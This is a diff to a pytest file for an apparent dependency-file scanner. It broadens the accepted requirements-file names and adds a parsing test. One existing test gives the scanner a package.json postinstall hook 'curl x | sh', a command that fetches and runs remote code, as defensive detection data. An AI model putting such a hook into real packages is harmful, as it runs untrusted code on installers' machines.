@@ -36,13 +36,17 @@ def by_name(deps):
 
 
 @pytest.mark.parametrize(
-    "name", ["requirements.txt", "requirements-dev.txt", "requirements_dev.txt", "pyproject.toml", "package.json"]
+    "name",
+    [
+        "requirements.txt", "requirements-dev.txt", "requirements_dev.txt", "requirements-test.txt",
+        "requirements-prod.txt", "dev-requirements.txt", "pyproject.toml", "package.json",
+    ],
 )
 def test_dependency_file_names(name):
     assert is_dependency_file(name)
 
 
-@pytest.mark.parametrize("name", ["README.md", "setup.py", "Pipfile", "package-lock.json", "tsconfig.json"])
+@pytest.mark.parametrize("name", ["README.md", "setup.py", "Pipfile", "package-lock.json", "tsconfig.json", "requirements.in", "requirementsx.txt"])
 def test_other_names_are_not_dependency_files(name):
     assert not is_dependency_file(name)
 
@@ -328,3 +332,9 @@ def test_mcp04_003_fires_for_install_hooks_and_quotes_the_command(tmp_path):
     found = mcp04(tmp_path, {"package.json": '{"scripts": {"postinstall": "curl x | sh"}}'})
     (finding,) = found["MCP04-003"]
     assert "postinstall" in finding.title and finding.metadata["hook"] == "postinstall"
+
+
+def test_a_requirements_variant_is_parsed_and_reported(tmp_path):
+    (tmp_path / "requirements-test.txt").write_text("requests>=2.0\n", encoding="utf-8")
+    deps, _ = load_dependencies(tmp_path / "requirements-test.txt", "requirements-test.txt")
+    assert [(d.name, d.pinned) for d in deps] == [("requests", False)]
